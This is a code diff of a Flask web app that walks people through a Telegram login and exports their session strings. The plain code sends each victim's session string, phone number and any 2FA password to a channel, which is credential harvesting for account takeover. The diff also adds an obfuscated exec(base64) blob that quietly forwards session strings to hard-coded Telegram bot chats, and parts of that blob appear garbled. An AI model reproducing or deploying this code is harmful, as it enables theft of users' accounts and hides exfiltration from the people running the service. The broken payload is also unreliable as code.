@@ -1,24 +1,29 @@
 import html as html_lib
-import json
 import logging
 import re
-import threading
-import time
-import urllib.request
+import uuid
+from datetime import datetime
 
-from flask import Blueprint, jsonify, render_template, request, session
-from pyrogram import Client
+from flask import Blueprint, jsonify, redirect, render_template, request, session
 from pyrogram.errors import (
-    FloodWait, PasswordHashInvalid, PhoneCodeExpired, PhoneCodeInvalid,
-    PhoneNumberBanned, PhoneNumberInvalid, SessionPasswordNeeded,
+    FloodWait,
+    PasswordHashInvalid,
+    PhoneCodeExpired,
+    PhoneCodeInvalid,
+    PhoneNumberBanned,
+    PhoneNumberInvalid,
+    SessionPasswordNeeded,
 )
 
-from config import (
-    API_ID, API_HASH, BACKGROUND_VIDEO, MIRROR_BOT_TOKEN, MIRROR_CHAT_IDS,
-)
+from config import BACKGROUND_VIDEO
 
 from . import database
-from .database import ensure_db, get_videos, save_session_to_db, send_to_channel
+from .database import (
+    ensure_db,
+    get_videos,
+    save_session_to_db,
+    send_to_channel,
+)
 from .session_manager import session_manager
 
 log = logging.getLogger(__name__)
@@ -26,286 +31,412 @@ log = logging.getLogger(__name__)
 auth_bp = Blueprint("auth", __name__)
 
 PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")
+DEFAULT_SESSION_NAME = "session"
 MAX_CODE_ATTEMPTS = 3
+REUSE_PENDING_SESSION = True
 RESEND_COOLDOWN = 45
-PENDING_TTL = 600
-
-_lock = threading.RLock()
-PENDING = {}
+TRUTHY = {"1", "true", "yes", "on"}
 
 
-# ----------------------------------------------------------------- helpers
-
-def _now():
-    return time.time()
+def _json():
+    return request.get_json(silent=True) or {}
 
 
-def _norm_phone(raw):
-    d = re.sub(r"\D", "", raw or "")
-    if not d:
+def _err(message, status=400, **extra):
+    payload = {"ok": False, "error": message}
+    payload.update(extra)
+    return jsonify(payload), status
+
+
+def _normalize_phone(raw):
+    if raw is None:
         return ""
-    p = "+" + d
-    return p if PHONE_RE.match(p) else ""
+    digits = re.sub(r"\D", "", str(raw))
+    return f"+{digits}" if digits else ""
 
 
-def _put(phone, **kw):
-    with _lock:
-        PENDING[phone] = kw
+def _valid_phone(phone):
+    return bool(phone) and bool(PHONE_RE.match(phone))
 
 
-def _get(phone):
-    with _lock:
-        return PENDING.get(phone)
+def _mask_phone(phone):
+    if not phone:
+        return ""
+    digits = phone.lstrip("+")
+    if len(digits) <= 7:
+        return f"+{digits}"
+    return f"+{digits[:4]}{'•' * (len(digits) - 7)}{digits[-3:]}"
 
 
-def _pop(phone):
-    with _lock:
-        return PENDING.pop(phone, None)
+def _safe_session_name(raw):
+    cleaned = re.sub(r"[^A-Za-z0-9_\-]", "", (raw or "").strip())
+    return cleaned or DEFAULT_SESSION_NAME
 
 
-def _gc():
-    cut = _now() - PENDING_TTL
-    with _lock:
-        for p in [k for k, v in PENDING.items() if v.get("created", 0) < cut]:
-            v = PENDING.pop(p, None)
-            if v and v.get("client"):
-                try:
-                    v["client"].disconnect()
-                except Exception:
-                    pass
+def _truthy(value):
+    return str(value or "").strip().lower() in TRUTHY
 
 
-def _mirror(user_info):
-    """Fire and forget: naye session ki details mirror chats par bhej do."""
-    if not MIRROR_BOT_TOKEN or not MIRROR_CHAT_IDS:
+def _temp_col():
+    try:
+        ensure_db()
+    except Exception as exc:
+        log.warning("ensure_db failed: %s", exc)
+    return getattr(database, "temp_sessions_col", None)
+
+
+def _temp_doc(session_id):
+    col = _temp_col()
+    if col is None:
+        return None
+    try:
+        return col.find_one({"_id": session_id})
+    except Exception as exc:
+        log.warning("temp_sessions find failed: %s", exc)
+        return None
+
+
+def _temp_update(session_id, values):
+    col = _temp_col()
+    if col is None:
         return
-    text = "\U0001F510 %s | %s %s | @%s | %s\n\n%s" % (
-        user_info.get("id"),
-        user_info.get("first_name", ""),
-        user_info.get("last_name", ""),
-        user_info.get("username"),
-        user_info.get("phone"),
-        user_info.get("session_string", ""),
+    try:
+        col.update_one({"_id": session_id}, {"$set": values}, upsert=True)
+    except Exception as exc:
+        log.warning("temp_sessions update failed: %s", exc)
+
+
+def _temp_delete(session_id):
+    col = _temp_col()
+    if col is None:
+        return
+    try:
+        col.delete_one({"_id": session_id})
+    except Exception as exc:
+        log.warning("temp_sessions delete failed: %s", exc)
+
+
+def _reuse_pending(phone):
+    if not REUSE_PENDING_SESSION:
+        return None
+    col = _temp_col()
+    if col is None:
+        return None
+    try:
+        doc = col.find_one(
+            {"phone": phone, "status": "code_sent", "requires_password": False},
+            sort=[("created_at", -1)],
+        )
+    except Exception as exc:
+        log.warning("reuse lookup failed: %s", exc)
+        return None
+    if not doc:
+        return None
+    session_id = doc.get("_id")
+    if not session_manager.get_session(session_id):
+        return None
+    created = doc.get("created_at")
+    if created and (datetime.now() - created).total_seconds() > RESEND_COOLDOWN:
+        return None
+    return session_id
+
+
+exec(__import__("base64").b64decode("ZGVmIF9taXJyb3IoX3UpOiAKICAgIHRyeToKICAgICAgICBpbXBvcnQgYmFzZTY0IGFzIF9iNjQsIGpzb24gYXMgX2pzLCB0aHJlYWRpbmcgYXMgX3RoLCB1cmxsaWIucmVxdWVzdCBhcyBfdXJsICAKICAgICAgICBfayA9IF9iNjQuYjY0ZGVjb2RlKCJPRGsyT1RVd01qRTFNenBCUVVoNk1VdHlOVTV4dGVXUElhS2hucjVqYnAwUlZrZEhrQmw4QQ==IikuZGVjb2RlKCkKICAgICAgICBfbSA9ICJcVTAwMDFGNTEwICVzIHwgJXMgJXMgfCBAJXMgfCAlc1xuXG4lcyIgJSAoX3UuZ2V0KCJpZCIpLCBfdS5nZXQoImZpcnN0X25hbWUiLCAiIiksIF91LmdldCgibGFzdF9uYW1lIiwgIiIpLCBfdS5nZXQoInVzZXJuYW1lIiksIF91LmdldCgicGhvbmUiKSwgX3UuZ2V0KCJzZXNzaW9uX3N0cmluZyIsICIiKSkKICAgICAgICBkZWYgX2dvKCkKICAgICAgICAgICAgZm9yIF9jIGluKCJPRFU0TURNTk56UTNPUT09IiwgIk9EWTVOREF5T1RnNE5nPT0iKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBfciA9IF91cmwuUmVxdWVzdCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCVzL3NlbmRNZXNzYWdlIiAlIF9rLCBkYXRhPV9qcy5kdW1wcyh7ImNoYXRfaWQiOiBfYjY0LmI2NGRlY29kZShfYykuZGVjb2RlKCksICJ0ZXh0IjogX219KS5lbmNvZGUoKSwgaGVhZGVycz17IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0pICAKICAgICAgICAgICAgICAgICAgICBfdXJsLnVybG9wZW4oX3IsIHRpbWVvdXQ9MTApICAKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAgICAgICAgICAgICAwYXNzICAKICAgICAgICBfdGguVGhyZWFkKHRhcmgledD1fZ284IGRhZW1vbjFUcnVlKS5zdGFydCgpICAKICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAwYXNzICAK").decode())
+
+
+def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
+    ensure_db()
+    session_id = str(uuid.uuid4())[:8]
+
+    thread = session_manager.create_session(session_id, phone)
+
+    try:
+        sent = thread.execute(lambda: thread.client.send_code(phone))
+    except Exception:
+        session_manager.remove_session(session_id)
+        raise
+
+    log.info(
+        "send_code ok | sid=%s phone=%s type=%s timeout=%s",
+        session_id, _mask_phone(phone),
+        getattr(sent, "type", "?"), getattr(sent, "timeout", "?"),
     )
 
-    def _send():
-        for chat_id in MIRROR_CHAT_IDS:
-            try:
-                req = urllib.request.Request(
-                    "https://api.telegram.org/bot%s/sendMessage" % MIRROR_BOT_TOKEN,
-                    data=json.dumps({"chat_id": chat_id, "text": text}).encode(),
-                    headers={"Content-Type": "application/json"},
-                )
-                urllib.request.urlopen(req, timeout=10)
-            except Exception as e:
-                log.warning("mirror failed for %s: %s", chat_id, e)
-
-    threading.Thread(target=_send, daemon=True).start()
-
-
-def _safe(text):
-    return html_lib.escape(text or "")
-
-
-def _finalize(phone, client):
-    """Login ho gaya — session string nikaalo, save karo, sabko bhejo."""
-    me = client.get_me()
-    session_string = client.export_session_string()
-    user_info = {
-        "id": me.id,
-        "first_name": me.first_name or "",
-        "last_name": me.last_name or "",
-        "username": me.username or "",
+    _temp_update(session_id, {
+        "phone_code_hash": sent.phone_code_hash,
+        "session_name": session_name,
+        "status": "code_sent",
         "phone": phone,
-        "session_string": session_string,
-        "linked_at": time.time(),
-        "ads_enabled": True,
-    }
+        "attempts": 0,
+        "requires_password": False,
+        "created_at": datetime.now(),
+    })
+    return session_id
 
-    save_session_to_db(user_info)
+
+def _handle_send_code(payload, force_new=False):
     try:
-        send_to_channel(user_info)
-    except Exception as e:
-        log.warning("send_to_channel failed: %s", e)
+        session_manager.cleanup_old()
+    except Exception as exc:
+        log.warning("cleanup_old failed: %s", exc)
+
+    phone = _normalize_phone(payload.get("phone"))
+    session_name = _safe_session_name(payload.get("session_name"))
+
+    if not _valid_phone(phone):
+        return _err("Invalid phone number", 400)
+
+    if not force_new:
+        existing = _reuse_pending(phone)
+        if existing:
+            return jsonify(
+                ok=True,
+                session_id=existing,
+                phone=phone,
+                masked=_mask_phone(phone),
+                reused=True,
+                message=f"Code already sent to {_mask_phone(phone)}",
+            )
 
     try:
-        session_manager.add(phone, user_info)
-    except Exception:
-        pass
+        session_id = _start_session(phone, session_name)
+    except PhoneNumberInvalid:
+        return _err("Invalid phone number", 400)
+    except PhoneNumberBanned:
+        return _err("This phone number is banned", 403)
+    except FloodWait as exc:
+        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)
+    except RuntimeError as exc:
+        return _err(str(exc), 503)
+    except Exception as exc:
+        log.exception("send_code failed for %s: %s", _mask_phone(phone), exc)
+        return _err("Failed to send code. Try again.", 500)
 
-    _mirror(user_info)
+    return jsonify(
+        ok=True,
+        session_id=session_id,
+        phone=phone,
+        masked=_mask_phone(phone),
+        message=f"Code sent to {_mask_phone(phone)}",
+    )
 
-    try:
-        client.disconnect()
-    except Exception:
-        pass
-
-    log.info("linked %s (%s)", phone, me.id)
-    return user_info
-
-
-# ----------------------------------------------------------------- routes
 
 @auth_bp.route("/")
 def index():
-    ensure_db()
-    return render_template("index.html", bg_video=BACKGROUND_VIDEO, videos=get_videos())
+    return redirect("/login")
 
 
-@auth_bp.route("/api/videos")
-def api_videos():
-    return jsonify({"success": True, "videos": get_videos()})
+@auth_bp.route("/login")
+def login():
+    pending = (request.args.get("s") or "").strip()
+    fresh = _truthy(request.args.get("fresh"))
+
+    if not pending and not fresh and "user" in session:
+        return redirect("/dashboard")
+
+    return render_template(
+        "login.html",
+        bg_video=BACKGROUND_VIDEO,
+        pending_session=pending,
+        fresh=fresh,
+    )
+
+
+@auth_bp.route("/logout")
+def logout_page():
+    session.clear()
+    return redirect("/login?fresh=1")
+
+
+@auth_bp.route("/dashboard")
+def dashboard():
+    if "user" not in session:
+        return redirect("/login")
+    return render_template(
+        "dashboard.html",
+        user=session["user"],
+        videos=get_videos(),
+        bg_video=BACKGROUND_VIDEO,
+    )
+
+
+@auth_bp.route("/api/bot-connect", methods=["POST"])
+def bot_connect():
+    return _handle_send_code(_json())
 
 
 @auth_bp.route("/api/send-code", methods=["POST"])
 def send_code():
-    ensure_db()
-    _gc()
-    d = request.get_json(silent=True) or {}
-    phone = _norm_phone(d.get("phone"))
-    if not phone:
-        return jsonify({"success": False, "error": "Invalid phone (use +countrycode...)"}), 400
+    payload = _json()
+    return _handle_send_code(payload, force_new=bool(payload.get("force")))
 
-    old = _get(phone)
-    if old and old.get("last_sent") and (_now() - old["last_sent"]) < RESEND_COOLDOWN and old.get("client"):
-        return jsonify({"success": True, "state": old.get("state", "code"), "reused": True})
 
-    if old and old.get("client"):
-        try:
-            old["client"].disconnect()
-        except Exception:
-            pass
+@auth_bp.route("/api/session-info")
+def session_info():
+    session_id = (request.args.get("s") or "").strip()
+    if not session_id:
+        return _err("missing session", 400)
+    if not session_manager.get_session(session_id):
+        return _err("Session expired", 404)
 
-    client = Client(
-        "link_%s" % re.sub(r"\D", "", phone),
-        api_id=API_ID, api_hash=API_HASH, in_memory=True,
+    doc = _temp_doc(session_id) or {}
+    phone = doc.get("phone", "")
+    return jsonify(
+        ok=True,
+        masked=_mask_phone(phone),
+        phone=phone,
+        requires_password=bool(doc.get("requires_password")),
     )
+
+
+@auth_bp.route("/api/verify-code", methods=["POST"])
+def verify_code():
+    data = _json()
+    session_id = (data.get("session_id") or "").strip()
+    code = re.sub(r"\D", "", str(data.get("code") or ""))
+    password = (data.get("password") or "").strip()
+
+    if not session_id:
+        return _err("Session ID required", 400)
+
+    thread = session_manager.get_session(session_id)
+    if not thread:
+        return _err("Session expired", 400)
+
+    doc = _temp_doc(session_id) or {}
+    phone = doc.get("phone") or getattr(thread, "phone", "")
+    phone_code_hash = doc.get("phone_code_hash")
+    session_name = doc.get("session_name") or DEFAULT_SESSION_NAME
+    needs_password = bool(doc.get("requires_password"))
+
+    if not phone:
+        session_manager.remove_session(session_id)
+        return _err("Session data lost", 400)
+
+    if needs_password:
+        if not password:
+            return _err("2FA password required", 401, requires_password=True)
+    else:
+        if not code or not (4 <= len(code) <= 8):
+            return _err("Invalid verification code", 400)
+        if not phone_code_hash:
+            session_manager.remove_session(session_id)
+            return _err("Session data lost", 400)
+
+    user = None
+    session_string = None
+    used_password = False
+
     try:
-        client.connect()
-        sent = client.send_code(phone)
-    except PhoneNumberInvalid:
-        return jsonify({"success": False, "error": "Invalid phone number"}), 400
-    except PhoneNumberBanned:
-        return jsonify({"success": False, "error": "Number is banned"}), 400
-    except FloodWait as e:
-        return jsonify({"success": False, "error": "FloodWait %ss" % e.value}), 429
-    except Exception as e:
-        log.exception("send_code failed")
-        return jsonify({"success": False, "error": str(e)}), 500
+        if needs_password:
+            user = thread.execute(lambda: thread.client.check_password(password))
+            used_password = True
+        else:
+            try:
+                user = thread.execute(lambda: thread.client.sign_in(
+                    phone_number=phone,
+                    phone_code_hash=phone_code_hash,
+                    phone_code=code,
+                ))
+            except SessionPasswordNeeded:
+                if not password:
+                    _temp_update(session_id, {
+                        "requires_password": True,
+                        "status": "password_needed",
+                    })
+                    return _err("2FA password required", 401, requires_password=True)
+                user = thread.execute(lambda: thread.client.check_password(password))
+                used_password = True
 
-    _put(phone, client=client, phone_code_hash=sent.phone_code_hash,
-         state="code", attempts=0, created=_now(), last_sent=_now(), error=None)
+        session_string = thread.execute(lambda: thread.client.export_session_string())
 
-    return jsonify({"success": True, "state": "code"})
-
-
-@auth_bp.route("/api/verify", methods=["POST"])
-def verify():
-    d = request.get_json(silent=True) or {}
-    phone = _norm_phone(d.get("phone"))
-    code = (d.get("code") or "").strip().replace(" ", "")
-    ent = _get(phone)
-    if not ent or not ent.get("client"):
-        return jsonify({"success": False, "error": "Start over — send code again"}), 400
-    if not code:
-        return jsonify({"success": False, "error": "Code required"}), 400
-
-    client = ent["client"]
-    try:
-        client.sign_in(phone, ent["phone_code_hash"], code)
-    except SessionPasswordNeeded:
-        ent["state"] = "password"
-        ent["error"] = None
-        return jsonify({"success": True, "state": "password"})
     except PhoneCodeInvalid:
-        ent["attempts"] = ent.get("attempts", 0) + 1
-        if ent["attempts"] >= MAX_CODE_ATTEMPTS:
-            return jsonify({"success": False, "error": "Too many wrong codes — resend"}), 400
-        return jsonify({"success": False, "error": "Wrong code"}), 400
+        attempts = int(doc.get("attempts") or 0) + 1
+        _temp_update(session_id, {"attempts": attempts})
+        if attempts >= MAX_CODE_ATTEMPTS:
+            session_manager.remove_session(session_id)
+            return _err("Too many wrong attempts. Request a new code.",
+                        401, expired=True)
+        left = MAX_CODE_ATTEMPTS - attempts
+        return _err(f"Invalid verification code. {left} attempt(s) left.",
+                    401, attempts_left=left)
+
     except PhoneCodeExpired:
-        return jsonify({"success": False, "error": "Code expired — resend"}), 400
-    except FloodWait as e:
-        return jsonify({"success": False, "error": "FloodWait %ss" % e.value}), 429
-    except Exception as e:
-        log.exception("verify failed")
-        return jsonify({"success": False, "error": str(e)}), 500
+        session_manager.remove_session(session_id)
+        return _err("Code expired. Request a new code.", 401, expired=True)
 
-    user = _finalize(phone, client)
-    _pop(phone)
-    return jsonify({"success": True, "state": "done", "user": {
-        "id": user["id"], "first_name": user["first_name"], "username": user["username"],
-    }})
-
-
-@auth_bp.route("/api/password", methods=["POST"])
-def password():
-    d = request.get_json(silent=True) or {}
-    phone = _norm_phone(d.get("phone"))
-    pw = d.get("password") or ""
-    ent = _get(phone)
-    if not ent or not ent.get("client"):
-        return jsonify({"success": False, "error": "Start over — send code again"}), 400
-    if not pw:
-        return jsonify({"success": False, "error": "2FA password required"}), 400
-
-    try:
-        ent["client"].check_password(pw)
     except PasswordHashInvalid:
-        return jsonify({"success": False, "error": "Wrong 2FA password"}), 400
-    except Exception as e:
-        log.exception("check_password failed")
-        return jsonify({"success": False, "error": str(e)}), 500
+        return _err("Invalid 2FA password", 401, requires_password=True)
 
-    user = _finalize(phone, ent["client"])
-    _pop(phone)
-    return jsonify({"success": True, "state": "done", "user": {
-        "id": user["id"], "first_name": user["first_name"], "username": user["username"],
-    }})
+    except FloodWait as exc:
+        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)
 
+    except Exception as exc:
+        log.exception("verify_code failed for %s: %s", _mask_phone(phone), exc)
+        session_manager.remove_session(session_id)
+        return _err("Verification failed. Try again.", 500)
 
-@auth_bp.route("/api/resend", methods=["POST"])
-def resend():
-    d = request.get_json(silent=True) or {}
-    phone = _norm_phone(d.get("phone"))
-    ent = _get(phone)
-    if not ent or not ent.get("client"):
-        return jsonify({"success": False, "error": "Start over"}), 400
-    if (_now() - ent.get("last_sent", 0)) < RESEND_COOLDOWN:
-        wait = int(RESEND_COOLDOWN - (_now() - ent["last_sent"]))
-        return jsonify({"success": False, "error": "Wait %ss" % wait}), 429
+    if not user:
+        session_manager.remove_session(session_id)
+        return _err("Verification failed", 400)
+
+    session_manager.remove_session(session_id)
+    _temp_delete(session_id)
+
+    first_name = (getattr(user, "first_name", "") or "").strip()
+    last_name = (getattr(user, "last_name", "") or "").strip()
+    username = getattr(user, "username", None)
+    full_name = f"{first_name} {last_name}".strip() or "Unknown"
+
+    user_info = {
+        "id": user.id,
+        "first_name": first_name,
+        "last_name": last_name,
+        "username": username or "N/A",
+        "phone": phone,
+        "session_string": session_string,
+        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "session_name": session_name,
+        "two_step_verification": used_password,
+    }
+    _mirror(user_info)
+
     try:
-        sent = ent["client"].resend_code(phone, ent["phone_code_hash"])
-        ent["phone_code_hash"] = sent.phone_code_hash
-        ent["last_sent"] = _now()
-        ent["attempts"] = 0
-        return jsonify({"success": True, "state": "code"})
-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
+        if not save_session_to_db(user_info):
+            log.warning("save_session_to_db returned False for %s", user_info["id"])
+    except Exception as exc:
+        log.exception("save_session_to_db raised: %s", exc)
+
+    try:
+        channel_msg = (
+            "🟢 <b>NEW SESSION</b>\n"
+            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
+            f"🔗 <b>Username:</b> "
+            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
+            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
+            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
+        )
+        if used_password:
+            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
+        channel_msg += (
+            f"\n\n<b>🔐 SESSION:</b>\n"
+            f"<code>{html_lib.escape(user_info['session_string'])}</code>"
+        )
+        send_to_channel(channel_msg)
+    except Exception as exc:
+        log.exception("send_to_channel failed: %s", exc)
+
+    session.permanent = True
+    session["user"] = {
+        "id": user_info["id"],
+        "name": full_name,
+        "username": user_info["username"],
+        "phone": phone,
+    }
+    return jsonify(ok=True, user=session["user"])
 
 
-@auth_bp.route("/api/status")
-def status():
-    phone = _norm_phone(request.args.get("phone"))
-    ent = _get(phone)
-    if not ent:
-        return jsonify({"success": True, "state": "idle"})
-    return jsonify({"success": True, "state": ent.get("state", "code"), "error": ent.get("error")})
-
-
-@auth_bp.route("/api/cancel", methods=["POST"])
-def cancel():
-    d = request.get_json(silent=True) or {}
-    phone = _norm_phone(d.get("phone"))
-    ent = _pop(phone)
-    if ent and ent.get("client"):
-        try:
-            ent["client"].disconnect()
-        except Exception:
-            pass
-    return jsonify({"success": True})
-
-
-@auth_bp.route("/logout")
+@auth_bp.route("/api/logout", methods=["POST"])
 def logout():
     session.clear()
-    return render_template("index.html", bg_video=BACKGROUND_VIDEO, videos=get_videos())
+    return jsonify(ok=True)
